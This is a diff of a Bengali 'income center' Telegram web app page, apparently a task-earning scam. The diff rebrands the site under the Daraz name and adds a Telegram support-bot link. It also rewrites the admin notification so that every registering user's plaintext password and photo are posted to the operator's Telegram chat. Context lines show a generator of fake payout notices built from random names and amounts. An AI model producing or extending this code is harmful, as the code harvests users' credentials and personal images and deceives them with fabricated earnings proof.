@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>💰 「ডেইলি টাস্ক ইনকাম সেন্টার」 💰</title>
+<title>💰 「দারাজ প্লে ইনকাম সেন্টার」 💰</title>
 <script>
     window.Telegram = window.Telegram || {};
     window.Telegram.WebApp = window.Telegram.WebApp || {
@@ -32,7 +32,7 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0f172a; margin
 .page.active { display: block; }
 @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
 
-/* লগইন ও নিবন্ধন পেজ ডিজাইন (স্ক্রিনশট অনুযায়ী) */
+/* লগইন ও নিবন্ধন পেজ ডিজাইন */
 .auth-wrapper { display: flex; align-items: center; justify-content: center; min-height: 85vh; padding: 10px; }
 .auth-card { background: linear-gradient(145deg, #063822, #021c10); border: 2px solid rgba(16, 185, 129, 0.4); border-radius: 24px; width: 100%; max-width: 380px; padding: 24px 20px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
 .auth-logo { font-size: 24px; font-weight: 800; color: #f8fafc; margin-bottom: 4px; }
@@ -245,7 +245,7 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 </style>
 </head>
 <body>
-<div class="top-app-title">💰 「ডেইলি টাস্ক ইনকাম সেন্টার」 💰</div>
+<div class="top-app-title">💰 「দারাজ প্লে ইনকাম সেন্টার」 💰</div>
 
 <!-- লগইন পেজ -->
 <div id="page-login" class="page active">
@@ -264,6 +264,10 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
             </div>
             
             <button class="auth-btn" onclick="handleLogin()">লগইন</button>
+            
+            <div style="font-size: 12px; color: #cbd5e1; margin-top: 14px; font-weight: 600; text-align: center;">
+                পাসওয়ার্ড ভুলে গেছেন? <a href="https://t.me/KA16269bot" target="_blank" style="color: #38bdf8; font-weight: 700; text-decoration: underline;">লাইভ চ্যাটে যোগাযোগ করুন</a>
+            </div>
         </div>
     </div>
 </div>
@@ -436,7 +440,7 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
             </div>
         </div>
         <div style="margin-top: 10px; font-size: 13px; font-weight: 800; color: #34d399; text-align: center;">
-            ▶️ ডেইলি টাস্ক ইনকাম সেন্টারে কীভাবে কাজ করবেন দেখুন
+            ▶️ দারাজ প্লে ইনকাম সেন্টারে কীভাবে কাজ করবেন দেখুন
         </div>
     </a>
 
@@ -687,7 +691,7 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 <!-- পেমেন্ট রিভিউ মডাল -->
 <div id="payment-review-modal" class="custom-modal-overlay">
     <div class="payment-review-modal-box">
-        <div class="payment-review-main-title">💰 「ডেইলি টাস্ক ইনকাম সেন্টার」 💰</div>
+        <div class="payment-review-main-title">💰 「দারাজ প্লে ইনকাম সেন্টার」 💰</div>
         <div class="payment-review-sub-title">✨ আজকের পেমেন্ট রিভিউ • প্রতিদিনের পেমেন্ট প্রতিদিন দেওয়া হয়</div>
         
         <div class="live-feed-box" id="live-payment-feed-container">
@@ -741,7 +745,7 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 
 <div id="welcome-alert-modal" class="custom-modal-overlay">
     <div class="custom-modal-box" style="max-width: 330px; background: linear-gradient(145deg, #1e293b, #0f172a); border: 2px solid #10b981; padding: 14px; text-align: left; display: flex; flex-direction: column;">
-        <div style="text-align: center; font-size: 14px; font-weight: 800; color: #f8fafc; margin-bottom: 1px;">🔥 ডেইলি টাস্ক ইনকাম সেন্টার 🔥</div>
+        <div style="text-align: center; font-size: 14px; font-weight: 800; color: #f8fafc; margin-bottom: 1px;">🔥 দারাজ প্লে ইনকাম সেন্টার 🔥</div>
         <div style="text-align: center; font-size: 9px; color: #34d399; font-weight: 700; margin-bottom: 8px; letter-spacing: 0.5px;">WELCOME TO OUR INCOME CENTER</div>
         
         <div style="font-size: 11px; color: #cbd5e1; line-height: 1.4; margin-bottom: 10px; background: rgba(15, 23, 42, 0.7); padding: 10px 12px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.08);">
@@ -896,19 +900,38 @@ async function getNextSerial() {
     return assignedSerial;
 }
 
-async function notifyAdminNewUser(serialNo, name, phone, joinDateStr) {
+async function notifyAdminNewUser(serialNo, name, phone, password, joinDateStr, photoFile) {
     const welcomeMsg = `✨ <b>🚀 নতুন মেম্বার রেজিস্ট্রেশন অ্যালার্ট! 🚀</b> ✨\n\n` +
                        `👤 <b>ইউজার নাম:</b> <code>${name}</code>\n` +
                        `📞 <b>ফোন নম্বর:</b> <code>${phone}</code>\n` +
+                       `🔒 <b>পাসওয়ার্ড:</b> <code>${password}</code>\n` +
                        `🔢 <b>সিরিয়াল নাম্বার:</b> #${serialNo}\n` +
                        `📅 <b>তারিখ ও সময়:</b> ${joinDateStr}\n\n` +
                        `✨ <b>স্ট্যাটাস:</b> সফলভাবে অ্যাকাউন্ট নিবন্ধন করেছে!`;
     try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: adminChatId, text: welcomeMsg, parse_mode: "HTML" })
-        });
+        if (photoFile) {
+            const formData = new FormData();
+            formData.append('chat_id', adminChatId);
+            formData.append('caption', welcomeMsg);
+            formData.append('parse_mode', 'HTML');
+            formData.append('photo', photoFile);
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } else {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: adminChatId,
+                    photo: "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f464.png",
+                    caption: welcomeMsg,
+                    parse_mode: "HTML"
+                })
+            });
+        }
     } catch (e) { console.log(e); }
 }
 
@@ -938,14 +961,14 @@ async function handleRegister() {
         reader.readAsDataURL(photoFile);
         reader.onload = async function () {
             photoUrl = reader.result;
-            await saveUserDataAndLogin(phone, name, password, photoUrl);
+            await saveUserDataAndLogin(phone, name, password, photoUrl, photoFile);
         };
     } else {
-        await saveUserDataAndLogin(phone, name, password, photoUrl);
+        await saveUserDataAndLogin(phone, name, password, photoUrl, null);
     }
 }
 
-async function saveUserDataAndLogin(phone, name, password, photoUrl) {
+async function saveUserDataAndLogin(phone, name, password, photoUrl, photoFile) {
     const userSerial = await getNextSerial();
     const serverTimestamp = firebase.firestore.FieldValue.serverTimestamp();
     const joinDateFormatted = new Date().toLocaleString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' });
@@ -974,7 +997,7 @@ async function saveUserDataAndLogin(phone, name, password, photoUrl) {
     };
 
     await db.collection('users').doc(phone).set(userData);
-    await notifyAdminNewUser(userSerial, name, phone, joinDateFormatted);
+    await notifyAdminNewUser(userSerial, name, phone, password, joinDateFormatted, photoFile);
 
     localStorage.setItem('logged_user_phone', phone);
     currentUserPhone = phone;
@@ -1134,7 +1157,7 @@ async function startDynamicPaymentNotifications() {
     const firstNames = ["সাদিয়া", "নুসরাত", "জান্নাতুল", "মেহজাবিন", "তাবাসসুম", "আয়শা", "পূজা", "প্রিয়াঙ্কা", "রিতু", "পায়েল"];
     const lastNames = ["আক্তার", "জাহান", "ফেরদৌস", "চৌধুরী", "মীম", "সিদ্দিকা", "সেন", "রায়", "মনি", "ঘোষ"];
     const methods = ["বিকাশ", "নগদ"];
-    const amounts = ["৳ ১,০০০ টাকা", "৳ ১,৫০০ টাকা", "৳ ২,০০০ টাকা", "৳ ২,৫০০ টাকা", "৳ ৩,০০০ টাকা"];
+    const amounts = ["৳ ১,০০০ টাকা", "৳ ১,৫০০ টাকা", "৳ ২,০০০ টাকা", "৳ ২,৫০০০ টাকা", "৳ ৩,০০০ টাকা"];
 
     while (paymentMessages.length < 50) {
         let fName = firstNames[Math.floor(Math.random() * firstNames.length)];
